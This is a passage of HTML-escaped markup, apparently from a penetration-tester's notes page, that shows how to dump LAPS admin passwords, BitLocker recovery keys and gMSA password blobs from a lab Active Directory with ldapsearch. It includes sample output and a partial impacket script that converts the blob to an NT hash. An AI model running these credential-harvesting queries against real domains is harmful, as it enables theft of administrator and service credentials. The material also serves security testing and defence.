&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -LLL -h 192.168.80.10 -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dc=sittingduck,dc=info&amp;#34;&lt;/span&gt; -x -D &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sittingduck\uberuser&amp;#34;&lt;/span&gt; -w &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ASDqwe123&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;(ms-Mcs-AdmPwdExpirationtime=*)&amp;#39;&lt;/span&gt; ms-Mcs-AdmPwd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DC1,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Domain Controllers,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ms-Mcs-AdmPwd: f/0HG3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;7d5P+e;/IE5wW8I/o//5&lt;span style=&#34;color:#f92672&#34;&gt;)}&lt;/span&gt;W
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;SDCLIENT_DAWIN7,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LabComputers,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Lab,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ms-Mcs-AdmPwd: /B+%R26cVSA1c0zOi&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-Z/#n1Q2sA,,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;SDLEGACY2K3,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LabComputers,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Lab,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;SD_WSUS_2012,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LabComputers,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Lab,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ms-Mcs-AdmPwd: &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;b+BC@p,7&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;6pqxj3y&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;MxBm9@h9Hy-
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;SDEXCHANGE,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LabComputers,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Lab,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;WIN-PM0ID6F0AHN,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LabComputers,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Lab,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ms-Mcs-AdmPwd: &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;3-%AN574#&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;/%t55!S+0!/10OJC;V
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DC2,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Domain Controllers,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ms-Mcs-AdmPwd: kMo,85&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;N&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uhUmWj183,3#T&amp;amp;d&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Aeddv
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;bitlocker-recovery-passwords&#34;&gt;BitLocker Recovery Passwords&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;src: &lt;a href=&#34;https://stackoverflow.com/a/50833203&#34;&gt;https://stackoverflow.com/a/50833203&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The key on this one is narrowing down the search base to a small list or a single computer. The reason this is important is that the Domain Controller you are asking the password from has to do a bunch of decryption to calculate this attribute on the fly, if you ask for too many (like every machine in the Domain) the connection will be closed out due to timeout.  Don&amp;rsquo;t be greedy, just get the one you need.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -h dc1.sittingduck.info -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=WIN10COMP1,OU=Workstations,DC=sittingduck,DC=info&amp;#34;&lt;/span&gt; msfve-recoverypassword
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;gmsa-nt-hash&#34;&gt;GMSA NT Hash&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;src: &lt;a href=&#34;https://stealthbits.com/blog/securing-gmsa-passwords/&#34;&gt;https://stealthbits.com/blog/securing-gmsa-passwords/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;src: &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket/pull/770&#34;&gt;https://github.com/SecureAuthCorp/impacket/pull/770&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Group Managed Service Accounts (GMSA) have randomly generated passwords that are default/generally pretty long. The &lt;code&gt;msDS-ManagedPassword&lt;/code&gt; in an at-runtime decrypted value that the Domain Controller has to construct in order to return, much like the BitLocker keys. However, unlike with BitLocker, generally there aren&amp;rsquo;t very many GMSAs so it&amp;rsquo;s less of a chance to knock over the DC if you get greedy and query them all.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ LDAPTLS_REQCERT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;never ldapsearch -LLL -H ldaps://192.168.80.10 -x -D uberuser -w ASDqwe123 -o ldif-wrap&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dc=sittingduck,dc=info&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;(&amp;amp;(ObjectClass=msDS-GroupManagedServiceAccount))&amp;#39;&lt;/span&gt; msDS-ManagedPassword
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;TestGMSA,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Managed Service Accounts,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-ManagedPassword:: AQAAACQCAAAQABIBFAIcAq/tlcA3PziSdtjxwKwcpM9VAteZa9No6et8yDWzgEYj5yFDhzT0OMFtTA4qAI4M+sWjiUVqYhDwFItW+5FlhaJp8tm/fcAfIDc5MAsYOXgq3AIc6ofCpeJga6Jw4SX/EKmnQdsS7lGmXd/yh27qJGj6SS0vwk//D8cr1+6s43YB0TxUxyLrruupZmd4Ndx2PZ4L4zkWa/vlRlDzadyeGwji70q9sfjH5x7+l7V+w5JK7/hKfG48swD8koEK/bHyLxZa8eDMEoscAmnuC/CA/pTvdF6jfIYmAYMGZujOVkbXJjaCEPGA1+nBDqkOQ1NlLZu4Y6Es1bB3YVIv6agDICYAAJ3USvAd5t267x9PfdetWSfLGRt4qxMCmOwXO0nVWMJTSYfjC+Phc0QX/rrTimPptYvx2NnuAclbgj0Fvg0iZfOvHW0SwdKTyKCvGeL+UPz4Jwr2VAd+PX43GoUPD8uBhDrtzVSwUhtScDIvzGJYgvHrREnTUqaf9pENqkVpbdXHtpE/buIphVrPEg84e9fgNB2a/r6sZaPX+1C8e/5pbNO7qoQ4fqXSDPM3qh6ymlh2ouNRoP0kN4sLVUvW+cNX+YQk7UJDSnG3fANPtgquhi6B4OVqU2fpypUbFtd91Ju/9xZeuod508FqYHPT1aX86tBdLj4yq2/65ROupERLVhAAADPE7gxzEgAAM2YeWnISAAA&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once you have this blob of text, you need to convert it into the NT hash using this tool:&lt;/p&gt;
&lt;p&gt;(this is a slightly modified version of the script that &lt;a href=&#34;https://twitter.com/agsolino&#34;&gt;agsolino&lt;/a&gt; posted)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; impacket.structure &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; hexdump, Structure
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; getopt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Source from: https://github.com/SecureAuthCorp/impacket/pull/770#issuecomment-589243865&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MSDS_MANAGEDPASSWORD_BLOB&lt;/span&gt;(Structure):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    structure &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Version&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;H&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Reserved&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;H&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Length&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;L&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CurrentPasswordOffset&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;H&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPasswordOffset&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;H&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;QueryPasswordIntervalOffset&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;H&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UnchangedPasswordIntervalOffset&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;H&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CurrentPassword&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPassword&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;#(&amp;#39;AlignmentPadding&amp;#39;,&amp;#39;:&amp;#39;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;QueryPasswordInterval&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UnchangedPasswordInterval&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Structure&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__(self, data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fromString&lt;/span&gt;(self, data):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Structure&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fromString(self,data)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPasswordOffset&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            endData &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;QueryPasswordIntervalOffset&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            endData &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPasswordOffset&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CurrentPassword&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rawData[self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CurrentPasswordOffset&amp;#39;&lt;/span&gt;]:][:endData &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CurrentPasswordOffset&amp;#39;&lt;/span&gt;]]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPasswordOffset&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPassword&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rawData[self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPasswordOffset&amp;#39;&lt;/span&gt;]:][:self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;QueryPasswordIntervalOffset&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PreviousPasswordOffset&amp;#39;&lt;/span&gt;]]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;QueryPasswordInterval&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rawData[self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;QueryPasswordIntervalOffset&amp;#39;&lt;/span&gt;]:][:self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UnchangedPasswordIntervalOffset&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;QueryPasswordIntervalOffset&amp;#39;&lt;/span&gt;]]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UnchangedPasswordInterval&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rawData[self[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UnchangedPasswordIntervalOffset&amp;#39;&lt;/span&gt;]:]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(argv):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    b64 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    verbose &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        opts, args &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getopt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getopt(argv,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hvb:&amp;#34;&lt;/span&gt;,[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;base64=&amp;#34;&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; getopt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GetoptError:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gmsa.py -b &amp;lt;msDS-ManagedPassword base64&amp;gt; -v (optional verbose)&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; opt, arg &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; opts:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; opt &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-h&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gmsa.py -b &amp;lt;msDS-ManagedPassword base64&amp;gt; -v (optional verbose)&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; opt &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-v&amp;#34;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            verbose &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
